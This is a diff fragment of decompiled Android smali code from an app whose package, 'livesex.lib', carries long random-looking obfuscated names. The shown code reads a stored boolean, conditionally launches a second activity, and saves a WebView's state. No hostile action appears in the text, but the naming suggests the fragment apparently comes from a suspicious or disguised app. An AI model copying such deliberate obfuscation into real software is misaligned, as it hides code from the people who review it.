+    sget-object v1, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->Cantgo:Ljava/lang/String;
+
+    const/4 v2, 0x1
+
+    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
+
+    move-result-object v2
+
+    invoke-static {v0, v1, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_31
+
+    .line 388
+    new-instance v0, Landroid/content/Intent;
+
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v1
+
+    const-class v2, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/SecondActivity;
+
+    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/high16 v1, 0x10000000
+
+    .line 389
+    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 390
+    invoke-virtual {p0, v0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->startActivity(Landroid/content/Intent;)V
+
+    .line 392
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->finish()V
+
+    :cond_31
+    return-void
+.end method
+
+.method protected onSaveInstanceState(Landroid/os/Bundle;)V
+    .registers 3
+
+    .line 118
+    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V
+
+    .line 119
+    iget-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mWebView:Landroid/webkit/WebView;
+
+    if-eqz v0, :cond_a
+
+    .line 121
+    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;
+
+    :cond_a
+    return-void
+.end method
